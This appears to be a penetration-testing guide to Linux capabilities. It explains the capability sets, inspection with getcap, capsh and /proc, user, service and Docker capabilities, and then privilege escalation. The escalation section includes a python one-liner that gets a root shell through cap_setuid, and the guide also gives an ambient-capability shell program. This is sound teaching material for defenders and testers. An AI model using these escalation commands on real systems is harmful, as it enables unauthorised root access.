# Linux Capabilities


## Linux Capabilities


Linux capabilities divide **root privileges into smaller, distinct units**, allowing processes to have a subset of privileges. This minimizes the risks by not granting full root privileges unnecessarily.

### The Problem:

- Normal users have limited permissions, affecting tasks like opening a network socket which requires root access.

### Capability Sets:

1. **Inherited (CapInh)**:

   - **Purpose**: Determines the capabilities passed down from the parent process.
   - **Functionality**: When a new process is created, it inherits the capabilities from its parent in this set. Useful for maintaining certain privileges across process spawns.
   - **Restrictions**: A process cannot gain capabilities that its parent did not possess.

2. **Effective (CapEff)**:

   - **Purpose**: Represents the actual capabilities a process is utilizing at any moment.
   - **Functionality**: It's the set of capabilities checked by the kernel to grant permission for various operations. For files, this set can be a flag indicating if the file's permitted capabilities are to be considered effective.
   - **Significance**: The effective set is crucial for immediate privilege checks, acting as the active set of capabilities a process can use.

3. **Permitted (CapPrm)**:

   - **Purpose**: Defines the maximum set of capabilities a process can possess.
   - **Functionality**: A process can elevate a capability from the permitted set to its effective set, giving it the ability to use that capability. It can also drop capabilities from its permitted set.
   - **Boundary**: It acts as an upper limit for the capabilities a process can have, ensuring a process doesn't exceed its predefined privilege scope.

4. **Bounding (CapBnd)**:

   - **Purpose**: Puts a ceiling on the capabilities a process can ever acquire during its lifecycle.
   - **Functionality**: Even if a process has a certain capability in its inheritable or permitted set, it cannot acquire that capability unless it's also in the bounding set.
   - **Use-case**: This set is particularly useful for restricting a process's privilege escalation potential, adding an extra layer of security.

5. **Ambient (CapAmb)**:
   - **Purpose**: Allows certain capabilities to be maintained across an `execve` system call, which typically would result in a full reset of the process's capabilities.
   - **Functionality**: Ensures that non-SUID programs that don't have associated file capabilities can retain certain privileges.
   - **Restrictions**: Capabilities in this set are subject to the constraints of the inheritable and permitted sets, ensuring they don't exceed the process's allowed privileges.

```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
    if process.has_capability('cap_setpcap'):
        process.add_capability_to_set('CapPrm', 'new_capability')
    process.limit_capabilities('CapBnd')
    process.preserve_capabilities_across_execve('CapAmb')
```

For further information check:

- [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)


## Processes & Binaries Capabilities


### Processes Capabilities

To see the capabilities for a particular process, use the **status** file in the /proc directory. As it provides more details, let’s limit it only to the information related to Linux capabilities.\
Note that for all running processes capability information is maintained per thread, for binaries in the file system it’s stored in extended attributes.

You can find the capabilities defined in /usr/include/linux/capability.h

You can find the capabilities of the current process in `cat /proc/self/status` or doing `capsh --print` and of other users in `/proc/<pid>/status`

```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```

This command should return 5 lines on most systems.

- CapInh = Inherited capabilities
- CapPrm = Permitted capabilities
- CapEff = Effective capabilities
- CapBnd = Bounding set
- CapAmb = Ambient capabilities set

```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```

These hexadecimal numbers don’t make sense. Using the capsh utility we can decode them into the capabilities name.

```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```

Lets check now the **capabilities** used by `ping`:

```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Although that works, there is another and easier way. To see the capabilities of a running process, simply use the **getpcaps** tool followed by its process ID (PID). You can also provide a list of process IDs.

```bash
getpcaps 1234
```

Lets check here the capabilities of `tcpdump` after having giving the binary enough capabilities (`cap_net_admin` and `cap_net_raw`) to sniff the network (_tcpdump is running in process 9562_):

```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

As you can see the given capabilities corresponds with the results of the 2 ways of getting the capabilities of a binary.\
The _getpcaps_ tool uses the **capget()** system call to query the available capabilities for a particular thread. This system call only needs to provide the PID to obtain more information.

### Binaries Capabilities

Binaries can have capabilities that can be used while executing. For example, it's very common to find `ping` binary with `cap_net_raw` capability:

```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```

You can **search binaries with capabilities** using:

```bash
getcap -r / 2>/dev/null
```

### Dropping capabilities with capsh

If we drop the CAP*NET_RAW capabilities for \_ping*, then the ping utility should no longer work.

```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```

Besides the output of _capsh_ itself, the _tcpdump_ command itself should also raise an error.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

The error clearly shows that the ping command is not allowed to open an ICMP socket. Now we know for sure that this works as expected.

### Remove Capabilities

You can remove capabilities of a binary with

```bash
setcap -r </path/to/binary>
```


## User Capabilities


Apparently **it's possible to assign capabilities also to users**. This probably means that every process executed by the user will be able to use the users capabilities.\
Base on on [this](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [this ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)and [this ](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user)a few files new to be configured to give a user certain capabilities but the one assigning the capabilities to each user will be `/etc/security/capability.conf`.\
File example:

```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```


## Environment Capabilities


Compiling the following program it's possible to **spawn a bash shell inside an environment that provides capabilities**.

```c:ambient.c
/*
 * Test program for the ambient capabilities
 *
 * compile using:
 * gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 * Set effective, inherited and permitted capabilities to the compiled binary
 * sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 *
 * To get a shell with additional caps that can be inherited do:
 *
 * ./ambient /bin/bash
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
  int rc;
  capng_get_caps_process();
  rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
  if (rc) {
    printf("Cannot add inheritable cap\n");
    exit(2);
  }
  capng_apply(CAPNG_SELECT_CAPS);
  /* Note the two 0s at the end. Kernel checks for these */
  if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
    perror("Cannot set cap");
    exit(1);
  }
}
void usage(const char * me) {
  printf("Usage: %s [-c caps] new-program new-args\n", me);
  exit(1);
}
int default_caplist[] = {
  CAP_NET_RAW,
  CAP_NET_ADMIN,
  CAP_SYS_NICE,
  -1
};
int * get_caplist(const char * arg) {
  int i = 1;
  int * list = NULL;
  char * dup = strdup(arg), * tok;
  for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
    list = realloc(list, (i + 1) * sizeof(int));
    if (!list) {
      perror("out of memory");
      exit(1);
    }
    list[i - 1] = atoi(tok);
    list[i] = -1;
    i++;
  }
  return list;
}
int main(int argc, char ** argv) {
  int rc, i, gotcaps = 0;
  int * caplist = NULL;
  int index = 1; // argv index for cmd to start
  if (argc < 2)
    usage(argv[0]);
  if (strcmp(argv[1], "-c") == 0) {
    if (argc <= 3) {
      usage(argv[0]);
    }
    caplist = get_caplist(argv[2]);
    index = 3;
  }
  if (!caplist) {
    caplist = (int * ) default_caplist;
  }
  for (i = 0; caplist[i] != -1; i++) {
    printf("adding %d to ambient list\n", caplist[i]);
    set_ambient_cap(caplist[i]);
  }
  printf("Ambient forking shell\n");
  if (execv(argv[index], argv + index))
    perror("Cannot exec");
  return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```

Inside the **bash executed by the compiled ambient binary** it's possible to observe the **new capabilities** (a regular user won't have any capability in the "current" section).

```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```

> [!CAUTION]
> You can **only add capabilities that are present** in both the permitted and the inheritable sets.

### Capability-aware/Capability-dumb binaries

The **capability-aware binaries won't use the new capabilities** given by the environment, however the **capability dumb binaries will us**e them as they won't reject them. This makes capability-dumb binaries vulnerable inside a special environment that grant capabilities to binaries.


## Service Capabilities


By default a **service running as root will have assigned all the capabilities**, and in some occasions this may be dangerous.\
Therefore, a **service configuration** file allows to **specify** the **capabilities** you want it to have, **and** the **user** that should execute the service to avoid running a service with unnecessary privileges:

```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```


## Capabilities in Docker Containers


By default Docker assigns a few capabilities to the containers. It's very easy to check which capabilities are these by running:

```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
	BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```


## Privesc/Container Escape


Capabilities are useful when you **want to restrict your own processes after performing privileged operations** (e.g. after setting up chroot and binding to a socket). However, they can be exploited by passing them malicious commands or arguments which are then run as root.

You can force capabilities upon programs using `setcap`, and query these using `getcap`:

```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```

The `+ep` means you’re adding the capability (“-” would remove it) as Effective and Permitted.

To identify programs in a system or folder with capabilities:

```bash
getcap -r / 2>/dev/null
```

### Exploitation example

In the following example the binary `/usr/bin/python2.6` is found vulnerable to privesc:

```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

**Capabilities** needed by `tcpdump` to **allow any user to sniff packets**:

```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```

### The special case of "empty" capabilities

[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): Note that one can assign empty capability sets to a program file, and thus it is possible to create a set-user-ID-root program that changes the effective and saved set-user-ID of the process that executes the program to 0, but confers no capabilities to that process. Or, simply put, if you have a binary that:

1. is not owned by root
2. has no `SUID`/`SGID` bits set
3. has empty capabilities set (e.g.: `getcap myelf` returns `myelf =ep`)

then **that binary will run as root**.
